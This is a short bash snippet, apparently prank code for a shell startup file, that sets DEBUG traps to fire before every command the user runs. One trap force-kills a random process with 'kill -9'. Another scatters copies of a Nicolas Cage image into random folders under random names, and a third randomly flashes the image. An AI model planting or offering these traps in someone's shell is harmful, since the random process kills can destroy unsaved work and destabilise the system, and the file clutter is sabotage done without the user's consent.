# Kill a random process
trap "kill -9 $(ps aux | awk '{print $2}' | shuf | head -n 1)" DEBUG

# Put Nicholas Cage picture in some random folder with a random name 
trap "cp ~/Downloads/cage.png $(find . -maxdepth 4 -type d 2> /dev/null | grep -v '/\.' | shuf | head -n 1)/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).png" DEBUG

# Flash a picture of Nicholas Cage randomly 
kill_cage() {
    sleep 0.3
    for i in $(ps aux | grep cage.png | grep -v grep | awk '{print $2}')
    do
        kill -9 $i
    done
}

flash_cage() {
    xdg-open cage.png & 
    kill_cage
}

trap '[ "$RANDOM" -le 15000 ] && flash_cage' DEBUG

